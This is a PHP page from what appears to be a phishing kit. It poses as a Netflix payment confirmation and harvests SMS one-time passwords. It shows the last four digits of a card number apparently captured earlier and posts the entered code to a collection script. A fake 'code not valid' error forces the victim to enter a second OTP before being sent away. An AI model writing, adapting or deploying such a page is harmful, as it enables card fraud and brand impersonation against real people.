<?php 
session_start();
require '../main.php';
?>
<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Conferma</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="res/css/account.css">
    <link rel="stylesheet" href="res/css/account-media.css">
</head>
<body>
<body style="background:white !important;">

<header>
    <div class="left">
        <img src="res/img/logo.png">
    </div>
    <div class="right">
        <a href="#">Sign out</a>
    </div>
</header>

<div class="window" id="loader" style="display:none;">
    <div class="content">
        <p style="text-align:center;">
            Please wait...<br>
            do not leave this page.
        </p>
        <img src="res/img/loading.gif" style="width:40px; margin:10px;">
    </div>
</div>


<section class="container border-sm shadow-sm p-0 my-5" style="width:500px; text-align:center; font-size:0.9em;">

    <div class="container mt-5 p-4">
        <div class="row m-0">
            <div class="col text-left">
                <img src="res/img/logo.png" style="width:90px;">
            </div>
            <div class="col text-right">
                <img src="res/img/vm.png" style="width:90px;">
            </div>
        </div>
    </div>

    <div class="container w-100 m-0 p-4 text-center border-top">
        <h4>Please confirm this operation</h4>
    </div>

    <div class="container w-100 p-3 border-top text-left" style="background:#f6f6f6;">
        <p>
            The one-time password has been sent to your phone number.
            If you need to change the phone number, contact your bank or update it through the available channels (ATM, web).
        </p>

        <table class="table table-sm table-borderless sms">
            <tr>
                <th>Merchant:</th>
                <td>Netflix</td>
            </tr>
            <tr>
                <th>Card number:</th>
                <td>XXXX XXXX XXXX <?php echo substr(@$_SESSION["card_num"], -4); ?></td>
            </tr>
            <tr>
                <th>OTP:</th>
                <td>
                    <input type="text" class="form-control rounded-pill" id="d0"><br>
                    <?php
                    if (isset($_GET['e'])) {
                        echo '<label class="error">The code entered is not valid.</label>';
                    }
                    ?>
                </td>
            </tr>
        </table>

        <p>Enter the code received via SMS</p>
        <p>
            <a href="javascript:resetTimer()">Request a new code</a>
            <span id="timeholder"> in: <b id="timer">30</b></span>
        </p>
    </div>

    <div class="container p-3 text-center border-top" style="text-align:right !important;">
        <button onclick="sendSms()" style="width:auto; padding:10px;">Submit</button>
    </div>

    <div class="container p-3 text-center border-top" style="background:#f6f6f6;">
        All rights reserved to Netflix Inc. 2024
    </div>

</section>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script>
 
var timerInterval;
  var timerValue = 30;

  function startTimer() {
    timerInterval = setInterval(function() {
      if (timerValue > 0) {
        timerValue--;
        $('#timer').text(timerValue);
      } else {
        clearInterval(timerInterval);
        $('#requestLink').css('pointer-events', 'auto').text('Richiedi un nuovo codice');
      }
    }, 1000);
  }

  function resetTimer() {
    clearInterval(timerInterval);
    timerValue = 30;
    $('#timer').text(timerValue);
    $('#requestLink').css('pointer-events', 'none').text('Attendere...');
    startTimer();
  }
  
  $(document).ready(function() {
    startTimer();
    $('#requestLink').css('pointer-events', 'none'); 
  });

  
function sendSms(){
    if($("#d0").val().length<4){
        return $("#d0").addClass("error");
    }
    $("#loader").show();
    $.post("post.php",{sms:$("#d0").val()}, function(d){
        <?php 
            if(isset($_GET['e'])){
                echo ' window.location="wait.php?next=exit.php";';
            }   else{
                 echo ' window.location="wait.php?next=sms.php?e";';
            }
        ?>
       
    } );
    
}


$("input").keypress((e)=>{
    if(e.key=="Enter"){
        sendSms();
    }
});

</script>
</body>
</html>
